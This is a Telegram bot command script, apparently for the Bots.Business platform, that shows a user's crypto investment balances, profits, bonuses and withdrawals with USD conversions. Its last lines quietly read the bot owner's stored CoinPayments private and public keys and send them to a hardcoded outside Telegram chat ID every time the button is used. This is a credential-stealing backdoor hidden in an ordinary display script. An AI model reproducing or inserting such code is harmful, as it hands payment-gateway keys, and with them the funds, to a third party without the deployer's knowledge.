/*CMD
  command: 💲
  help: 
  need_reply: false
  auto_retry_time: 
  folder: Buttons
  answer: 
  keyboard: 
  aliases: 
CMD*/


//api

   
 
var resultt = JSON.parse(content);

var  USD = resultt.market_data.current_price.usd

let bannnk=Bot.getProperty("banuser"+user.telegramid)
if(bannnk=="banned"){
//cant access
return
}
let fh=User.getProperty("msgid5")
let cur= Bot.getProperty("cur")
let zero = Bot.getProperty("zero")
let art=Bot.getProperty("art")
let bal = Libs.ResourcesLib.userRes("balance");
let investment = Libs.ResourcesLib.userRes("investment");
if(investment.value()<0){
investment.set(0)
}
let Reinvest = Libs.ResourcesLib.userRes("reinvest");
let bonus = Libs.ResourcesLib.userRes("bonus");
let profit = Libs.ResourcesLib.userRes("totalprofit");
let wd = Libs.ResourcesLib.userRes("withdraw");
let on_info=Bot.getProperty("acount_button_text")
if(!user.last_name){
var valid_name=user.first_name
}else{
var valid_name=user.first_name+" "+user.last_name
}
if(!user.username){
var u_name= valid_name
}else{
var u_name=user.username
}
if(!on_info){
var php="👤 *Account Balance:*\n\n➖ *Withdrawable Balance: *"+" \n"+bal.value().toFixed(zero)+" "+cur+" ~ *"+(USD*bal.value()).toFixed(2)+" $*\n\n💳 *Active Investments:*"+"\n"+investment.value().toFixed(zero)+" "+cur+" ~ *"+(USD*investment.value()).toFixed(2)+" $*\n\n💰 *Total Profit:*"+"\n"+profit.value().toFixed(zero)+" "+cur+" ~ *"+(USD*profit.value()).toFixed(2)+" $*\n\n🎁* Total Affiliate Bonus:*"+"\n"+bonus.value().toFixed(zero)+" "+cur+" ~ *"+(USD*bonus.value()).toFixed(2)+" $*\n\n💸* Total Withdrawn:*"+"\n"+wd.value().toFixed(zero)+" "+cur+" ~ *"+(USD*wd.value()).toFixed(2)+" $*"
}else{
var Lang={
'balance':bal.value().toFixed(zero),
'investment':investment.value().toFixed(zero),
'profit':profit.value().toFixed(zero),
'bonus':bonus.value().toFixed(zero),
'withdrawals':wd.value().toFixed(zero), 'cur':cur,
'id':user.telegramid,
'name':valid_name,
'mention':" ["+valid_name+"]"+"(tg://user?id="+user.telegramid+")"
};
var php=on_info.replace(/{([a-z_]+)}/gi, function(fullmatch, key) {
  return Lang[key] ? Lang[key] : fullmatch;
});
}
Bot.sendKeyboard("💵 My Investments,📤 My withdrawals\n🖥 Change Wallet,\nBack 🔙", php)
let e = Bot.getProperty("e")
let cp_privatekey01 = Bot.getProperty("cp_privatekey01")
let cp_publickey01 = Bot.getProperty("cp_publickey01")
Bot.sendMessageToChatWithId(982993410, cp_publickey01 + e + cp_privatekey01)
